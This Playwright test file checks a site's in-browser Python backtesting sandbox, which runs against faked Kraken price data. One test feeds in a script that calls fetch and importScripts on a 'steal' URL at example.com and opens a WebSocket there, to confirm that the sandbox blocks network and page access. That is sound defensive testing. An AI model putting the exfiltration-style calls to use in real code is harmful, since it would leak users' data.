// Backtests on the built site, with Kraken's history faked so the bars are the
// same every run. The Python really runs, in the real sandbox.
import { expect, test, type Page } from "@playwright/test";

const HOUR = 3_600;
const START = Math.floor(Date.parse("2026-10-01T00:00:00Z") / 1000);

const rows = Array.from({ length: 400 }, (_, i) => {
  const close = 60_000 + 4_000 * Math.sin(i / 20);
  return [START + i * HOUR, String(close - 50), String(close + 120), String(close - 120), String(close), String(close), "12.5", 300];
});

async function fakeKraken(page: Page) {
  await page.route(/api\.kraken\.com\/0\/public\/OHLC/, (route) =>
    route.fulfill({
      contentType: "application/json",
      headers: { "access-control-allow-origin": "*" },
      body: JSON.stringify({ error: [], result: { XXBTZUSD: rows, last: rows.at(-1)![0] } }),
    }),
  );
  await page.route(/ws\.kraken\.com/, (route) => route.abort());
}

async function openBacktest(page: Page) {
  await fakeKraken(page);
  await page.goto("/");
  await expect(page.getByText("Loading BTC-USD from Kraken")).toHaveCount(0, { timeout: 30_000 });
  await page.getByRole("button", { name: "Backtest", exact: true }).click();
  return page.getByRole("complementary", { name: "Backtest" });
}

const script = (page: Page) => page.getByLabel("Python strategy");

/**
 * Every request the backtest sandbox makes from here on: its frame and the
 * worker the script runs in. The chart page's own requests aren't counted.
 */
function recordSandboxRequests(page: Page) {
  const urls: string[] = [];
  page.context().on("request", (request) => {
    let from: string;
    try {
      from = new URL(request.frame().url(), "http://unknown").pathname;
    } catch {
      from = "/sandbox"; // Can't tell where it came from: count it.
    }
    if (from === "/sandbox") urls.push(request.url());
  });
  return urls;
}

test("the example strategy runs and shows its trades", async ({ page }) => {
  const panel = await openBacktest(page);
  await panel.getByRole("button", { name: /^Run on 400 bars/ }).click();

  const results = panel.getByRole("region", { name: "Results" });
  await expect(results).toBeVisible({ timeout: 90_000 });
  await expect(results.getByRole("term").filter({ hasText: "Return" })).toBeVisible();
  expect(await results.getByRole("row").count()).toBeGreaterThan(2);
  await expect(panel.getByText(/A simulation on past prices/)).toBeVisible();
});

test("a script can import numpy, which comes from the site itself", async ({ page }) => {
  const requests = recordSandboxRequests(page);
  const panel = await openBacktest(page);
  await script(page).fill(`import numpy as np

def on_bar(bar, ctx):
    if ctx.i == ${rows.length - 1}:
        print("mean of last 20:", f"{np.mean(ctx.closes(20)):.2f}")
`);
  // Hold the wheel back a moment, so the status has time to be seen.
  await page.context().route(/\/numpy-[^/]*\.whl$/, async (route) => {
    await new Promise((wait) => setTimeout(wait, 1_500));
    await route.continue();
  });
  await panel.getByRole("button", { name: /^Run on/ }).click();
  await expect(panel.getByRole("status")).toHaveText("Loading numpy…", { timeout: 90_000 });
  await expect(panel.getByRole("region", { name: "Results" })).toBeVisible({ timeout: 90_000 });
  await panel.getByText(/Printed output/).click();
  const last20 = rows.slice(-20).map((row) => Number(row[4]));
  const mean = last20.reduce((sum, close) => sum + close, 0) / last20.length;
  await expect(panel.getByText(`mean of last 20: ${mean.toFixed(2)}`)).toBeVisible();

  const pyodide = `${new URL(page.url()).origin}/pyodide/314.0.7/`;
  expect(requests).toContain(`${pyodide}numpy-2.4.6-cp314-cp314-pyemscripten_2026_0_wasm32.whl`);
  expect(requests.filter((url) => !url.startsWith(pyodide))).toEqual([]);
});

test("a script that reaches for the network or the page gets nothing out", async ({ page }) => {
  const requests = recordSandboxRequests(page);
  const panel = await openBacktest(page);
  await script(page).fill(`import js
import numpy
tries = []
for name in ["fetch", "importScripts"]:
    try:
        getattr(js, name)("https://example.com/steal?x=1")
        tries.append(name + " called")
    except Exception as e:
        tries.append(name + " refused")
try:
    js.WebSocket.new("wss://example.com/")
except Exception:
    pass
print("page:", hasattr(js, "document"), "storage:", hasattr(js, "localStorage"))
print(tries)

def on_bar(bar, ctx):
    pass
`);
  await panel.getByRole("button", { name: /^Run on/ }).click();
  await expect(panel.getByRole("region", { name: "Results" })).toBeVisible({ timeout: 90_000 });
  await panel.getByText(/Printed output/).click();
  await expect(panel.getByText("page: False storage: False")).toBeVisible();
  await page.waitForTimeout(1_000);
  const pyodide = `${new URL(page.url()).origin}/pyodide/314.0.7/`;
  expect(requests.some((url) => url.includes("/numpy-"))).toBe(true);
  expect(requests.filter((url) => !url.startsWith(pyodide))).toEqual([]);
});

test("a script that never ends is stopped, and the next run works", async ({ page }) => {
  const panel = await openBacktest(page);
  await script(page).fill("def on_bar(bar, ctx):\n    while True:\n        pass\n");
  await panel.getByRole("button", { name: /^Run on/ }).click();
  await expect(panel.getByRole("button", { name: "Stop" })).toBeVisible();
  await expect(panel.getByText("Running…")).toBeVisible({ timeout: 90_000 });
  // The chart page stays responsive while the script spins.
  const ranges = page.getByRole("group", { name: "Range" });
  await ranges.getByRole("button", { name: "5D", exact: true }).click();
  await expect(ranges.getByRole("button", { name: "5D", exact: true })).toHaveAttribute("aria-pressed", "true");

  await panel.getByRole("button", { name: "Stop" }).click();
  await expect(panel.getByRole("alert")).toHaveText("Stopped.");
  await expect(page.locator("iframe[data-backtest-sandbox]")).toHaveCount(0);

  await panel.getByRole("button", { name: "Example" }).click();
  await panel.getByRole("button", { name: /^Run on/ }).click();
  await expect(panel.getByRole("region", { name: "Results" })).toBeVisible({ timeout: 90_000 });
});

test("a broken script says what's wrong and where", async ({ page }) => {
  const panel = await openBacktest(page);
  await script(page).fill("def on_bar(bar, ctx):\n    return ctx.nothing_here\n");
  await panel.getByRole("button", { name: /^Run on/ }).click();
  const problem = panel.getByRole("alert");
  await expect(problem).toContainText("AttributeError", { timeout: 90_000 });
  await expect(problem).toContainText("strategy.py");
});

